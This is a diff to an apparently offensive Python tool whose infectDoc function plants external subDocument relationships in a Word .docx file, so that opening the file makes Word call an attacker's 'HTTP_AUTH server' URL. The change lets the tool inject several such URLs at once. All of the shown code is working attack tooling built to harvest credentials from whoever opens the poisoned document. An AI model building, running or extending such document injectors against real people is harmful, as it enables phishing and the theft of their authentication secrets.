@@ -25,12 +25,14 @@ except(ImportError):
     raise SystemExit
 
 # Placeholder for settings.xml.rels
-SETRELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+SETRELS_HEADER = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 		<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-			<Relationship Id="rId{}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument"
+                """
+SETRELS = """    <Relationship Id="rId{}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument"
 			Target="{}"
 			TargetMode="External"/>
-		</Relationships>"""
+            """
+SETRELS_FOOTER = """    </Relationships>"""
 
 class UpdateableZipFile(ZipFile):
     # Beautiful solution by: http://stackoverflow.com/a/35435548
@@ -165,6 +167,7 @@ def infectDoc(goodocx, badocx, url, identifier, reinfect=False):
     tempdir = tempfile.mkdtemp()
     temp_zip_path = os.path.join(tempdir, 'temp.docx')
     shutil.copy(goodocx, badocx)
+    orig_identifier = identifier
     if reinfect:
         with ZipFile(badocx) as arc:
             with arc.open('word/settings.xml') as fr:
@@ -178,12 +181,20 @@ def infectDoc(goodocx, badocx, url, identifier, reinfect=False):
                 docx = fr.read()
             closepos = docx.index('/>')+2
             prepos = docx[:closepos]
-            editpos = '<w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
-            postpos = docx[closepos:]
+            editpos = ""
+            for i in url:
+                editpos += '<w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
+                identifier += 1
+            postpos = docx[closepos+2:]
             settingsxml = "{}{}{}".format(prepos, editpos, postpos)
     with UpdateableZipFile(badocx, "a") as inj:
         inj.writestr("word/settings.xml", settingsxml)
-        inj.writestr("word/_rels/settings.xml.rels", SETRELS.format(identifier, url))
+        tmp = ""
+        identifier = orig_identifier
+        for i in url:
+            tmp += SETRELS.format(identifier, i)
+            identifier += 1
+        inj.writestr("word/_rels/settings.xml.rels", SETRELS_HEADER + tmp + SETRELS_FOOTER)
     print("[*] {} has been injected and output is: {}".format(goodocx, badocx))
 
 def main():
@@ -196,7 +207,7 @@ def main():
             formatter_class=argparse.ArgumentDefaultsHelpFormatter)
         parser.add_argument('-i', '--infile', help='docx File to inject')
         parser.add_argument('-o', '--outfile', help='Filename of the file post injection')
-        parser.add_argument('-u', '--url', help='Domain pointed to HTTP_AUTH server. e.g. https://domain.com/docs/target-UUID')
+        parser.add_argument('-u', '--url', action='append', help='Domain pointed to HTTP_AUTH server. e.g. https://domain.com/docs/target-UUID')
         parser.add_argument('-d', '--identifier', help='Document identifier', default=100)
 
         # Parse arguments
